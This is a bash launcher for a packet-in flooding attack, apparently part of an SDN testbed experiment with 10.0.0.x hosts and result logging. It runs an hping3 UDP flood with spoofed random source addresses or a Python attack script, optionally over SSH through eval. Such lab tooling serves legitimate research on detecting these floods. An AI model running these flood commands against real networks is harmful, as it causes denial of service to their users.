#!/usr/bin/env bash
set -euo pipefail

RATE=1200
SIZE=64
DURATION=90
TARGET=""
TARGET_PREFIX="10.0.0."
OUT="results/tmp"
CMD_PREFIX=""
METHOD="hping3"
IFACE="h2-eth0"
REMOTE_SCRIPT_DIR=""

while [ $# -gt 0 ]; do
  case "$1" in
    --rate) RATE="$2"; shift 2;;
    --size) SIZE="$2"; shift 2;;
    --duration) DURATION="$2"; shift 2;;
    --target) TARGET="$2"; shift 2;;
    --target-prefix) TARGET_PREFIX="$2"; shift 2;;
    --out) OUT="$2"; shift 2;;
    --cmd-prefix) CMD_PREFIX="$2"; shift 2;;
    --method) METHOD="$2"; shift 2;;
    --iface) IFACE="$2"; shift 2;;
    --remote-script-dir) REMOTE_SCRIPT_DIR="$2"; shift 2;;
    *) echo "Unknown arg: $1" >&2; exit 2;;
  esac
done

mkdir -p "$OUT"
SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
if [ -z "$REMOTE_SCRIPT_DIR" ]; then
  REMOTE_SCRIPT_DIR="$SCRIPT_DIR"
fi

# If running through SSH, write attack_sent.csv to /tmp on the attacker so missing result directories do not break the run.
if [ -n "$CMD_PREFIX" ]; then
  ATTACK_LOG="/tmp/sdn_attack_sent_${METHOD}.csv"
else
  ATTACK_LOG="$OUT/attack_sent.csv"
fi

case "$METHOD" in
  scapy)
    CMD="sudo python3 '$REMOTE_SCRIPT_DIR/packetin_attack.py' --method scapy --iface '$IFACE' --rate '$RATE' --size '$SIZE' --duration '$DURATION' --log '$ATTACK_LOG'"
    ;;
  hping3)
    if [ -z "$TARGET" ]; then
      TARGET="10.0.0.3"
    fi
    # hping3 flood: random source IPs to increase flow diversity.
    # --flood sends as fast as possible; RATE is kept for labels/config but does not throttle hping3.
    # Single invocation avoids shell-quoting issues when the command is sent through SSH via eval.
    CMD="sudo timeout '$DURATION' hping3 --udp --flood --rand-source -d '$SIZE' -p 9991 '$TARGET'"
    ;;
  udp)
    if [ -n "$TARGET" ]; then
      CMD="python3 '$REMOTE_SCRIPT_DIR/packetin_attack.py' --method udp --rate '$RATE' --size '$SIZE' --duration '$DURATION' --target '$TARGET' --log '$ATTACK_LOG'"
    else
      CMD="python3 '$REMOTE_SCRIPT_DIR/packetin_attack.py' --method udp --rate '$RATE' --size '$SIZE' --duration '$DURATION' --target-prefix '$TARGET_PREFIX' --log '$ATTACK_LOG'"
    fi
    ;;
  *)
    echo "Unknown method: $METHOD" >&2
    exit 2
    ;;
esac

if [ -n "$CMD_PREFIX" ]; then
  eval "$CMD_PREFIX $CMD" > "$OUT/attack_stdout.log" 2> "$OUT/attack_stderr.log" &
else
  eval "$CMD" > "$OUT/attack_stdout.log" 2> "$OUT/attack_stderr.log" &
fi

echo $! > "$OUT/attack.pid"
echo "attack_pid=$(cat "$OUT/attack.pid") method=$METHOD"
